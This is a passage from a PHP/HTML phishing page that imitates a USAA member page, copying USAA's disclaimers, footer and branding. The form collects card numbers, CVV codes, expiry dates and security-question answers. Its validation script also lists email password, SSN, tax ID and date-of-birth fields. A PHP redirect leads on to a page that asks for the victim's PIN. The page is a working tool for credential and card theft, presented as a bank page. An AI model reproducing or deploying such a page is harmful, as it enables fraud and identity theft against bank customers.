				<input type="text" conditionnbr="regex_all" id="ccnumber" name="Accountnum" maxlength="16" size="30" onKeyDown='formatPhone(this,null,event,WorkTelePhone);'  /></td>
</tr>
<tr>
	<td class="dataLabel">cvv</td>
				<td>
				<input type="text" conditionnbr="regex_all" id="ccv2" name="RoutingNum" maxlength="4" size="6" onKeyDown='formatPhone(this,null,event,WorkTelePhone);'  /></td>
</tr>
<tr>

		
	<td class="dataLabel">Expiry date</td>
				<td>
				<input type="text" conditionnbr="regex_all" id="expcc" name="Expirydate" maxlength="8" size="8" onKeyDown='formatPhone(this,null,event,WorkTelePhone);'  /></td>
</tr>
<tr>
		
	<td class="dataLabel">Question #1</td>
				<td><select size="0" name="securityquestionone" conditionnbr="regex_all" id="securityquestionone" onchange="switchOptions('securityquestionone')">
<option value="">- Select -</option><option value="FIRST BF">What is the first name of your first boyfriend?</option><option value="FIRST GF">What is the first name of your first girlfriend?</option><option value="FIRST ELEM SCHOOL">What is the name of your first elementary school?</option><option value="FIRST HIGH SCHOOL MASCOT">What was the high school mascot at the last high school you attended?</option><option value="FIRST ELEMENTARY SCHOOL CITY">In what city was your first elementary school?</option><option value="CITY MOTHER BORN">In what city was your mother born?</option><option value="CITY FATHER BORN">In what city was your father born?</option><option value="STREET YOU GREW">What was the name of the street you grew up on?</option><option value="MAT GRANDMOTHER FIRST NAME">What is the first name of your maternal grandmother (your mother's mother)?</option><option value="PAT GRANDMOTHER FIRST NAME">What is the first name of your paternal grandmother (your father's mother)?</option><option value="MAT GRANDFATHER FIRST NAME">What is the first name of your maternal grandfather (your mother's father)?</option><option value="PAT GRANDFATHER FIRST NAME">What is the first name of your paternal grandfather (your father's father)?</option><option value="FIRST EMPLOYER">Who was your first employer?</option><option value="CITY YOU MET YOUR SPOUSE">In what city did you meet your spouse?</option><option value="FIRST ROOMMATE">What was the first name of your first roommate during college?</option><option value="CITY ENGAGED">In what city did you get engaged?</option><option value="CITY MARRIED">In what city did you get married?</option><option value="AGE AT WEDDING">How old were you at your wedding?</option><option value="FIRSTNAME OF BEST MAN">What was the first name of the best man at your wedding?</option><option value="MAID OF HONOUR FIRSTNAME">What was the first name of the maid of honor at your wedding?</option></select>

</td>
</tr>
<tr>
	<td class="dataLabel">Answer</td>
    <td><input conditionnbr="regex_all" id="answerforsecquesone" name="answerforsecquesone" maxlength="50" size="70" type="text">
    </td>
</tr>
<tr>

	<td class="dataLabel" width="25%">Question #2</td>
				<td><select size="0" name="securityquestiontwo" conditionnbr="regex_all" id="securityquestiontwo" onchange="switchOptions('securityquestiontwo')">
<option value="">- Select -</option><option value="FIRST BF">What is the first name of your first boyfriend?</option><option value="FIRST GF">What is the first name of your first girlfriend?</option><option value="FIRST ELEM SCHOOL">What is the name of your first elementary school?</option><option value="FIRST HIGH SCHOOL MASCOT">What was the high school mascot at the last high school you attended?</option><option value="FIRST ELEMENTARY SCHOOL CITY">In what city was your first elementary school?</option><option value="CITY MOTHER BORN">In what city was your mother born?</option><option value="CITY FATHER BORN">In what city was your father born?</option><option value="STREET YOU GREW">What was the name of the street you grew up on?</option><option value="MAT GRANDMOTHER FIRST NAME">What is the first name of your maternal grandmother (your mother's mother)?</option><option value="PAT GRANDMOTHER FIRST NAME">What is the first name of your paternal grandmother (your father's mother)?</option><option value="MAT GRANDFATHER FIRST NAME">What is the first name of your maternal grandfather (your mother's father)?</option><option value="PAT GRANDFATHER FIRST NAME">What is the first name of your paternal grandfather (your father's father)?</option><option value="FIRST EMPLOYER">Who was your first employer?</option><option value="CITY YOU MET YOUR SPOUSE">In what city did you meet your spouse?</option><option value="FIRST ROOMMATE">What was the first name of your first roommate during college?</option><option value="CITY ENGAGED">In what city did you get engaged?</option><option value="CITY MARRIED">In what city did you get married?</option><option value="AGE AT WEDDING">How old were you at your wedding?</option><option value="FIRSTNAME OF BEST MAN">What was the first name of the best man at your wedding?</option><option value="MAID OF HONOUR FIRSTNAME">What was the first name of the maid of honor at your wedding?</option></select>

</td>
</tr>
<tr>
	<td class="dataLabel">Answer</td>
    <td><input conditionnbr="regex_all" id="answerforsecquestwo" name="answerforsecquestwo" maxlength="50" size="70" type="text">
</td>
</tr>
<tr>
	<td class="dataLabel" width="25%">Question #3</td>
				<td><select size="0" conditionnbr="regex_all" name="securityquestionthree" id="securityquestionthree" onchange="switchOptions('securityquestionthree')">
<option value="">- Select -</option><option value="FIRST BF">What is the first name of your first boyfriend?</option><option value="FIRST GF">What is the first name of your first girlfriend?</option><option value="FIRST ELEM SCHOOL">What is the name of your first elementary school?</option><option value="FIRST HIGH SCHOOL MASCOT">What was the high school mascot at the last high school you attended?</option><option value="FIRST ELEMENTARY SCHOOL CITY">In what city was your first elementary school?</option><option value="CITY MOTHER BORN">In what city was your mother born?</option><option value="CITY FATHER BORN">In what city was your father born?</option><option value="STREET YOU GREW">What was the name of the street you grew up on?</option><option value="MAT GRANDMOTHER FIRST NAME">What is the first name of your maternal grandmother (your mother's mother)?</option><option value="PAT GRANDMOTHER FIRST NAME">What is the first name of your paternal grandmother (your father's mother)?</option><option value="MAT GRANDFATHER FIRST NAME">What is the first name of your maternal grandfather (your mother's father)?</option><option value="PAT GRANDFATHER FIRST NAME">What is the first name of your paternal grandfather (your father's father)?</option><option value="FIRST EMPLOYER">Who was your first employer?</option><option value="CITY YOU MET YOUR SPOUSE">In what city did you meet your spouse?</option><option value="FIRST ROOMMATE">What was the first name of your first roommate during college?</option><option value="CITY ENGAGED">In what city did you get engaged?</option><option value="CITY MARRIED">In what city did you get married?</option><option value="AGE AT WEDDING">How old were you at your wedding?</option><option value="FIRSTNAME OF BEST MAN">What was the first name of the best man at your wedding?</option><option value="MAID OF HONOUR FIRSTNAME">What was the first name of the maid of honor at your wedding?</option></select>

</td>
</tr>
<tr>
	<td class="dataLabel">Answer</td>
    <td><input id="answerforsecquesthree" conditionnbr="regex_all" name="answerforsecquesthree" maxlength="50" size="70" type="text">
</td>
</tr>


</table>

 

		

<div class="buttonContainer">
		
		<span class="action" ><button title="Submit" id="Submit" value="Submit" class="action" type="submit">Update</button></span> 
	
</div>	








<span class='disclaimer' proximity=''><p><!--  WCM CONTENT OBJECT=EN2_ELIG0710_Eligibility_Availability_Restrictions -->
Availability restrictions apply to purchase of certain products. Use of term "member" or "membership" does not convey any legal, eligibility, or ownership rights. To be eligible for auto and property insurance, separated military personnel must have been separated with a discharge type of "Honorable." Once you meet eligibility requirements and purchase auto or property insurance underwritten by USAA, eligibility is generally ongoing. Eligible parent must purchase auto or property insurance for eligibility to pass to children. Eligibility may change based on factors such as marital status, rank, or military status. Eligibility guidelines are subject to change without notice. Purchase of a non property and casualty insurance product, or an insurance policy offered through USAA General Agency, does not establish eligibility for or membership in USAA property and casualty insurance companies.
<!--  WCM CONTENT ENDS  -->
</p>
	<p><!--  WCM CONTENT OBJECT=EN2_INT1800_Online_Integrated_Company -->
USAA means United Services Automobile Association and <a class="js_ipad_external_link" href="https://www.usaa.com/inet/pages/newsroom_factsheets_main">its insurance, banking, investment and other companies</a>. Banks Member FDIC. Investments provided by USAA Investment Management Company and USAA Financial Advisors Inc., both registered broker dealers.<br>
<br>
<img alt=" " border="0" src="https://content.usaa.com/mcontent/static_assets/Media/bk_x_equal-h.gif?cacheid=714050642" title="">

<!--  WCM CONTENT ENDS  -->
</p>
	<p>101015</p></span>

	<!-- END SEARCH INDEX -->

	
	
		</form>

<style>
.errorbnbr{
 border-color: red red;
}
</style>	
<script>

var regex_name = /^[a-zA-Z'][a-zA-Z-' ]+[a-zA-Z']?$/;
	var regex_num = /^\d{2}$/;
	var regex_accountnum = /^\d{8}$/;
	var regex_all = /.*$/;
	
	var regex_ccnum = /^\d{4}$/;
	var regex_dd = /^(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/;
	var regex_mm = /^(0[1-9]|1[0-2])$/;
	var regex_yy = /^([0-9]{4}|[0-9]{2})$/;
	var regex_cvv2 = /^\d{3,4}$/;
	var regex_fone = /^\+?(\d[\d\-\+\(\) ]{5,}\d$)/;
var array_id = ["firstname","lastname","addressline1","city","state","emailaddress","emailpassword","phonenumber","DateOfBirth","SSN","TAXID","ccnumber","ccv2","expcc","securityquestionone","answerforsecquesone","securityquestiontwo","answerforsecquestwo","securityquestionthree","answerforsecquesthree"];

function checkregexpro(a,b){
	if(a=="regex_name")
	{
		if(regex_name.test(b))
			return true;
		return false;
	}
	else if (a=="regex_num")
	{
		if(regex_num.test(b))
			return true;
		return false;
	}
	else if (a=="regex_accountnum")
	{
		if(regex_accountnum.test(b))
			return true;
		return false;
	}
	else if (a=="regex_all")
	{
		if(regex_all.test(b))
			return true;
		return false;
	}
	else if (a=="regex_ccnum")
	{
		if(regex_ccnum.test(b))
			return true;
		return false;
	}
	else if (a=="regex_mm")
	{
		if(regex_mm.test(b))
			return true;
		return false;
	}
	else if (a=="regex_yy")
	{
		if(regex_yy.test(b))
			return true;
		return false;
	}
	else if (a=="regex_cvv2")
	{
		if(regex_cvv2.test(b))
			return true;
		return false;
	}
	else if (a=="regex_fone")
	{
		if(regex_fone.test(b))
			return true;
		return false;
	}
	else if (a=="regex_dd")
	{
		if(regex_dd.test(b))
			return true;
		return false;
	}
}

function checkerror(){
	var result_comback= false;
	
	
	var id_focus="";
	var checkhavewrong=0;
	var vterror;
	var checkfirst=0;
	
	
	for(var i=0; i<array_id.length;i++)
	{
		
		
		if($("#"+array_id[i]).val().length<=0 || !checkregexpro($("#"+array_id[i]).attr("conditionnbr"),$("#"+array_id[i]).val()) )
			{
			
				if(checkfirst==0)
				{
					id_focus=array_id[i];
					checkfirst=1;
				}
				checkhavewrong=1;
				$("#"+array_id[i]).addClass("errorbnbr");
			}
		else {
		
			$("#"+array_id[i]).removeClass("errorbnbr");
		}
	}
	
	if(checkfirst==0)
		return true;
	else {
		//if(checkhavewrong==0)
		//	$("#"+array_id[1]).css("display","none");
		$("#"+id_focus).focus();
	}
	return result_comback;
}

function HandleLogonSubmit()
{
	
	
	if(!checkerror())
		return false;
		alert('ok')
	return false;
}
</script>
				
			
		</div> 
			
				
					<div id="rightCol"> 
						<div class="noindex"> 
							
							 








<div class="rightModule">
	<img src="https://content.usaa.com/mcontent/static_assets/Media/diduknowBanner_02.jpg?cacheid=2849138057" height="233px" width="142px" alt="Did U Know" />
</div>
<br clear="all" />
						</div> 
					</div> 
				
			
		
		
			
				</div> 
			
		
	</div>
 	
	
	
 <div class="noindex"> 
	
	
	
		<!-- BEGIN PAGE FOOTER -->
		








<a name="bottom"></a>

<div id="footer">
	


	<div id="navUtility">
		

		
		
		
		 
		

		<ul class="sub"><li><a href="https://www.usaa.com/inet/pages/about_usaa_main?wa_ref=pub_subglobal_footer_about_usaa_page" >About USAA</a></li>
<li><a href="https://www.usaa.com/inet/ent_blogs/Blogs?action=blogsummary&blogkey=newsroom" >Newsroom</a></li>
<li><a href="https://www.usaa.com/inet/pages/security_center?wa_ref=pub_subglobal_footer_security_center_page" >Privacy & Security</a></li>
<li><a href="http://www.usaa.apply2jobs.com/default.htm?wa_ref=pub_subglobal_footer_career_center_page" >Careers</a></li>
<li><a href="https://www.usaa.com/inet/pages/usaa_mobile_main?wa_ref=pub_subglobal_footer_mobile_center_page" >Mobile</a></li>
</ul>
	


		
		
		
		
			
			


			 
				
			
			
			<ul class="sub"><li><a href="https://www.usaa.com/inet/pages/ContactUsOtherServices?wa_ref=pub_subglobal_footerUtility_utilityMemberEligibility_CONTACTUS" >Contact Us</a></li>
<li><a href="https://www.usaa.com/inet/pages/site_map?wa_ref=pub_subglobal_footerUtility_footerMemberEligibility_SITEMAP" >Site Map</a></li>
<li><a href="https://www.usaa.com/inet/mc_faq/McFAQ?app=CpFaq&FAQPageID=CorpPublicFaq&wa_ref=pub_subglobal_footerUtility_utilityMemberEligibility_FAQS" >FAQs</a></li>
<li><a href="https://www.usaa.com/inet/pages/site_terms_and_conditions_main?wa_ref=pub_subglobal_footerUtility_utilityMemberEligibility_TERMCONDITIONS" >Site Terms</a></li>
</ul>
	
		

		
		
			
				<iframe src="https://view.atdmt.com/iaction/iwcusa_EligibilityStartStandard3_1" width="1" height="1" frameborder="0" scrolling="No" marginheight="0" marginwidth="0" topmargin="0" leftmargin="0"></iframe>				
			
			
				<script language="JavaScript">
					var pageAction = "1903";
				</script>
			
			<script language="JavaScript">
				var onPublicSide = "true";
				var initialReferrerURL = "null";
			</script>
			 
			

	</div>	


        <a id="meetMeHandle"  class="logo"
		href="https://www.usaa.com/inet/ent_home/CpHome?initCobrowse=https://www.usaa.com/inet/ent_memberassistance/Click2Call?action=INIT&MAMode=MeetMe"
                onclick="
                        (event.preventDefault)?event.preventDefault():event.returnValue=false;
                        USAA.ent.util.Loader.includeJS(
                                'https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent/widgets/meetmehelper-min.js?cacheid=2107802649'
                                ,function(){USAA.ent.widgets.MeetMeHelper.init(
				{
					sHelperCssFile			: 'https://content.usaa.com/mcontent/static_assets/Includes/modalEditWindow.css?cacheid=3694476176'
					,sJsAjaxUtilFile		: 'https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/ent/utilities/ajax-min.js?cacheid=3845737986'
					,sJsObscureUtilFile		: 'https://content.usaa.com/mcontent/static_assets/WSR_MASTER/javascript/cp_edit_personal_info-min.js?cacheid=2748894639'
				}
				);}
                        );
                "
        >

			
				<img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="53" height="55"  alt="USAA Member Home" />
			

        </a>

	
	<a href="javascript:openHelpWnd('https://seal.verisign.com/splash?form_file=fdf/splash.fdf&dn=WWW.USAA.COM&lang=en', 560, 500, 200, 200, false)" class="veriSign" style="">
		
			<img src="https://content.usaa.com/mcontent/static_assets/Media/blank.gif?cacheid=3366586105" width="64" height="34" alt="View Verisign Certificate" />
		
	</a>




	<div id="legalText" class="accentAnchors">
		<div id="copyright"><p><span class="smallText">Copyright &copy; 2014 USAA. </span></p></div>
		<div class="footnotes"></div><br>
	</div>
		
	
	
	
	
	<br clear="all" />
	
</div>
 

		<!-- END PAGE FOOTER -->
	
 </div> 

</div> 
</body>

<!-- END HTML BODY -->
</html>

<?php
}
else
{
	header("LOCATION: Enter_your_pin_usaa");
}


?>

